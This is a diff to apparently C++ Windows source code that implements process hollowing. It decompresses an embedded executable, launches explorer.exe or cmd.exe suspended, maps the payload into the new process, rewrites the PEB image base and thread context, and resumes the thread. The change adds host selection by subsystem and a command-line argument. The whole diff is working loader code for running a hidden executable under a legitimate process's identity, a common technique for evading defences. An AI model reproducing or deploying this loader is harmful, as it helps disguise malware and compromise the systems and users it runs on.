@@ -106,145 +106,115 @@ NTSTATUS ProtectImage(HANDLE hProcess, PVOID RemoteBase, PIMAGE_NT_HEADERS pinth
 	#error target architecture not supported
 #endif
 
-void Inject(PVOID BaseOfImage)
+void Inject(PVOID BaseOfImage, ULONG SizeOfImage, PCWSTR lpCommandLine = 0)
 {
-	if (PIMAGE_NT_HEADERS pinth = RtlImageNtHeader(BaseOfImage))
+	PIMAGE_NT_HEADERS pinth;
+	if (0 <= RtlImageNtHeaderEx(0, BaseOfImage, SizeOfImage, &pinth) &&
+		pinth->FileHeader.Machine == RtlImageNtHeader(&__ImageBase)->FileHeader.Machine)
 	{
-		HANDLE hSection;
-
-		ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage;
-
-		if (0 <= FindNoCfgDll(SizeOfImage, &hSection))
+		PCWSTR lpFileName;
+		switch (pinth->OptionalHeader.Subsystem)
 		{
-			SIZE_T ViewSize = 0;
-			PVOID BaseAddress = 0;
+		case IMAGE_SUBSYSTEM_WINDOWS_GUI:
+			lpFileName = L"explorer.exe";
+			break;
+		case IMAGE_SUBSYSTEM_WINDOWS_CUI:
+			lpFileName = L"cmd.exe";
+			break;
+		default:
+			return ;
+		}
 
-			if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 0, 0, 
-				&ViewSize, ViewUnmap, 0, PAGE_NOACCESS))
+		WCHAR ApplicationName[MAX_PATH];
+		if (SearchPathW(0, lpFileName, 0, _countof(ApplicationName), ApplicationName, 0))
+		{
+			HANDLE hSection;
+
+			if (0 <= FindNoCfgDll(SizeOfImage = pinth->OptionalHeader.SizeOfImage, &hSection))
 			{
-				ULONG op;
-				if (VirtualProtect(BaseAddress, SizeOfImage, PAGE_READWRITE, &op))
+				SIZE_T ViewSize = 0;
+				PVOID BaseAddress = 0;
+
+				if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 
+					0, 0, 0, &ViewSize, ViewUnmap, 0, PAGE_NOACCESS))
 				{
-					RtlZeroMemory(BaseAddress, SizeOfImage);
-
-					CopyImage(BaseAddress, BaseOfImage, pinth);
-
-					STARTUPINFO si = { sizeof(si) };
-					PROCESS_INFORMATION pi;
-					WCHAR explorer[] = L"explorer.exe";
-
-					if (CreateProcessW(0, explorer, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
+					ULONG op;
+					if (VirtualProtect(BaseAddress, SizeOfImage, PAGE_READWRITE, &op))
 					{
-						CONTEXT ctx {};
-						ctx.ContextFlags = CONTEXT_INTEGER;
+						RtlZeroMemory(BaseAddress, SizeOfImage);
 
-						PROCESS_BASIC_INFORMATION pbi;
-						PVOID ImageBaseAddress;
+						CopyImage(BaseAddress, BaseOfImage, pinth);
 
-						PVOID RemoteBase = 0;
-						ViewSize = SizeOfImage;
-						BOOL fOk = FALSE;
+						STARTUPINFO si = { sizeof(si) };
+						PROCESS_INFORMATION pi;
 
-						if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
-							GetThreadContext(pi.hThread, &ctx) &&
-							0 <= NtReadVirtualMemory(pi.hProcess, 
-							&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress, 
-							&ImageBaseAddress, sizeof(ImageBaseAddress), 0) &&
-							0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
+						if (CreateProcessW(ApplicationName, const_cast<PWSTR>(lpCommandLine),
+							0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
 						{
-							Relocate(BaseAddress, (LONG_PTR)RemoteBase);
+							CONTEXT ctx{};
+							ctx.ContextFlags = CONTEXT_INTEGER;
 
-							ctx.EP_REG = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;
+							PROCESS_BASIC_INFORMATION pbi;
+							PVOID ImageBaseAddress;
 
-							fOk = VirtualProtectEx(pi.hProcess, RemoteBase, SizeOfImage, PAGE_READWRITE, &op) &&
-								0 <= NtWriteVirtualMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
-								0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
-								0 <= NtWriteVirtualMemory(pi.hProcess, 
-								&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
-								&RemoteBase, sizeof(RemoteBase), 0) &&
-								0 <= NtSetContextThread(pi.hThread, &ctx) &&
-								0 <= NtResumeThread(pi.hThread, 0);
+							PVOID RemoteBase = 0;
+							ViewSize = SizeOfImage;
+							BOOL fOk = FALSE;
+
+							if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
+								GetThreadContext(pi.hThread, &ctx) &&
+								0 <= NtReadVirtualMemory(pi.hProcess,
+									&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
+									&ImageBaseAddress, sizeof(ImageBaseAddress), 0) &&
+								0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
+							{
+								Relocate(BaseAddress, (LONG_PTR)RemoteBase);
+
+								ctx.EP_REG = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;
+
+								fOk = VirtualProtectEx(pi.hProcess, RemoteBase, SizeOfImage, PAGE_READWRITE, &op) &&
+									0 <= NtWriteVirtualMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
+									0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
+									0 <= NtWriteVirtualMemory(pi.hProcess,
+										&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
+										&RemoteBase, sizeof(RemoteBase), 0) &&
+									0 <= NtSetContextThread(pi.hThread, &ctx) &&
+									0 <= NtResumeThread(pi.hThread, 0);
+							}
+
+							if (!fOk)
+							{
+								TerminateProcess(pi.hProcess, 0);
+							}
+
+							NtClose(pi.hThread);
+							NtClose(pi.hProcess);
 						}
-
-						if (!fOk)
-						{
-							TerminateProcess(pi.hProcess, 0);
-						}
-
-						NtClose(pi.hThread);
-						NtClose(pi.hProcess);
 					}
-				}
-			}
 
-			ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
-			NtClose(hSection);
+					ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
+				}
+
+				NtClose(hSection);
+			}
 		}
 	}
-}
-
-#include <compressapi.h>
-
-inline ULONG BOOL_TO_ERROR(BOOL f)
-{
-	return f ? NOERROR : GetLastError();
 }
 
 ULONG Unzip(_In_ LPCVOID CompressedData,
 	_In_ ULONG CompressedDataSize,
 	_Out_ PVOID* pUncompressedBuffer,
-	_Out_ ULONG* pUncompressedDataSize)
-{
-	ULONG dwError;
-	COMPRESSOR_HANDLE DecompressorHandle;
-
-	if (NOERROR == (dwError = BOOL_TO_ERROR(CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, 0, &DecompressorHandle))))
-	{
-		SIZE_T UncompressedBufferSize = 0;
-		PVOID UncompressedBuffer = 0;
-
-		while (ERROR_INSUFFICIENT_BUFFER == (dwError = BOOL_TO_ERROR(Decompress(
-			DecompressorHandle, CompressedData, CompressedDataSize,
-			UncompressedBuffer, UncompressedBufferSize, &UncompressedBufferSize))) && !UncompressedBuffer)
-		{
-			if (!(UncompressedBuffer = LocalAlloc(LMEM_FIXED, UncompressedBufferSize)))
-			{
-				dwError = GetLastError();
-				break;
-			}
-		}
-
-		if (NOERROR == dwError)
-		{
-			if (UncompressedBuffer)
-			{
-				*pUncompressedDataSize = (ULONG)UncompressedBufferSize;
-				*pUncompressedBuffer = UncompressedBuffer, UncompressedBuffer = 0;
-			}
-			else
-			{
-				dwError = ERROR_INTERNAL_ERROR;
-			}
-		}
-
-		if (UncompressedBuffer)
-		{
-			LocalFree(UncompressedBuffer);
-		}
-
-		CloseDecompressor(DecompressorHandle);
-	}
-
-	return dwError;
-}
+	_Out_ ULONG* pUncompressedDataSize);
 
 void WINAPI ep(PVOID pv)
 {
 	pv = codesec_exe_begin;
+	
 	ULONG cb = RtlPointerToOffset(codesec_exe_begin, codesec_exe_end);
+	
 	if (NOERROR == Unzip(pv, cb, &pv, &cb))
 	{
-		Inject(pv);
+		Inject(pv, cb);
 		LocalFree(pv);
 	}
 	
